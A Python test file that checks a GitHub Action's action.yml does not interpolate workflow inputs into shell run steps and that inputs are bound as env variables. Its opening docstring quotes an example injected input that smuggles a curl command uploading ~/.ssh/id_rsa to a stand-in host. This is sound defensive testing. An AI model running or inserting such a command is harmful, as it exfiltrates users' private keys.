"""The GitHub Action must not interpolate workflow inputs into the shell.

`${{ ... }}` is text substitution performed before bash ever sees the
script, so an input containing `"; curl --upload-file ~/.ssh/id_rsa evil`
ran as code with the runner's credentials. Inputs are passed as `env:`
variables and referenced as `"$NAME"`, which bash expands as data.

Fails on the pre-fix action.yml, which interpolated `inputs.checkout`,
`inputs.version`, `inputs.no-sign-request` and `inputs.use-acceleration`
straight into `run:` bodies.
"""

import re
from pathlib import Path

import yaml

ACTION = Path(__file__).resolve().parents[1] / "action.yml"

INPUT_REF = re.compile(r"inputs\.([A-Za-z0-9_-]+)")
ENV_BINDING = re.compile(r"\$\{\{\s*inputs\.([A-Za-z0-9_-]+)\s*\}\}")


def _steps():
    return yaml.safe_load(ACTION.read_text())["runs"]["steps"]


def _bindings(step):
    """Input names this step exposes as env variables, by exact binding."""
    return {
        m.group(1)
        for m in (ENV_BINDING.fullmatch(str(v)) for v in (step.get("env") or {}).values())
        if m
    }


def test_no_github_expression_inside_a_run_body():
    for step in _steps():
        if "run" not in step:
            continue
        assert "${{" not in step["run"], (
            f"step {step.get('name')!r} interpolates a GitHub expression "
            "into the shell script"
        )


def test_every_input_a_step_uses_is_bound_to_an_env_variable():
    for step in _steps():
        run = step.get("run")
        if run is None:
            continue
        # `if:` is evaluated by the runner as an expression, not by the
        # shell, so it is not an injection surface and is excluded here.
        used = set(INPUT_REF.findall(run)) | {
            name
            for value in (step.get("env") or {}).values()
            for name in INPUT_REF.findall(str(value))
        }
        bound = _bindings(step)
        assert used <= bound, (
            f"step {step.get('name')!r} uses inputs {sorted(used - bound)} "
            "without binding them in env:"
        )
        for name in set(step.get("env") or {}):
            assert f"${name}" in run, (
                f"step {step.get('name')!r} binds ${name} but never reads it"
            )
